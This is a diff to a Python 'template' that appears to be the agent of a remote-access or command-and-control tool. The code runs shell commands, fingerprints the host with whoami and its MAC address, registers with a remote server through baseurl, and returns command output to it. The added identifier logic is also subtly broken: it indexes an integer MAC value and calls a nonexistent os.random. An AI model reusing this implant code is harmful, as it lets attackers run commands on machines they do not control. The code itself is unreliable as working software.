@@ -1,6 +1,7 @@
 
 #####   BEGIN TEMPLATE  #####
 import os, time, _thread, requests
+from uuid import getnode
 from subprocess import Popen, PIPE
 
 def run_cmd(cmd):
@@ -18,7 +19,29 @@ def run_cmd(cmd):
                 except:
                         return str(res)
 
-agent = run_cmd("whoami")
+mac = getnode()
+user = run_cmd("whoami")
+agent = ''
+
+try:
+	agent += user[0]
+	agent += user[1]
+	agent += user[2]
+	agent += user[3]
+except:
+	pass
+try:
+	agent += mac[-1]
+	agent += mac[-2]
+	agent += mac[-3]
+	agent += mac[-4]
+except:
+	pass
+
+if agent == "":
+	agent = run_cmd("whoami")
+if agent == "":
+	agent = os.random(2)
 requests.get(baseurl+"/new?agent="+agent)
 def reply_cmd(cmd,id):
         res = run_cmd(cmd)
